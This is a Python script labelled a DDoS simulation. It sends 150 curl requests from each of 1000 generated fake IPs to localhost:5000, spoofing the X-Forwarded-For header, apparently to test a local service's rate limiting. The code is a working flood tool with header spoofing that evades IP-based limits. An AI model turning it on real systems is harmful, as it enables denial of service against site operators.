import subprocess
import concurrent.futures
import time

NUM_IPS = 1000
NUM_REQUESTS = 150

def send_requests_from_ip(ip):
    print(f"Starting requests from IP {ip}")
    for i in range(NUM_REQUESTS):
        try:
            print(f"IP {ip}: Sending request {i + 1}")
            subprocess.run([
                'curl', 
                '-s',  
                '-o', '/dev/null',  
                '--header', f'X-Forwarded-For: {ip}',  
                'http://localhost:5000'
            ])
        except Exception as e:
            print(f"Error sending request {i + 1} from IP {ip}: {e}")


def generate_fake_ip_pair(index):
    ip1 = f"{(index + 9) % 254 + 1}.{(index + 6) % 254 + 1}.{(index + 3) % 254 + 1}.{index % 254 + 1}"
    ip2 = f"{(index + 10) % 254 + 1}.{(index + 7) % 254 + 1}.{(index + 4) % 254 + 1}.{(index + 1) % 254 + 1}"
    ip3 = f"{(index + 11) % 254 + 1}.{(index + 8) % 254 + 1}.{(index + 5) % 254 + 1}.{(index + 2) % 254 + 1}"
    return ip1, ip2, ip3

def main():
    start_time = time.time()

    print(f"Starting the DDoS simulation with {NUM_IPS} IPs, each sending {NUM_REQUESTS} requests.")

    with concurrent.futures.ThreadPoolExecutor() as ip_executor:
        
        for i in range(0, NUM_IPS, 3):
            ip1, ip2, ip3 = generate_fake_ip_pair(i)
            ip_executor.submit(send_requests_from_ip, ip1)
            ip_executor.submit(send_requests_from_ip, ip2)
            ip_executor.submit(send_requests_from_ip, ip3)

    total_time = time.time() - start_time
    print(f"\nDDoS simulation completed in {total_time:.2f} seconds.")

if __name__ == "__main__":
    main()
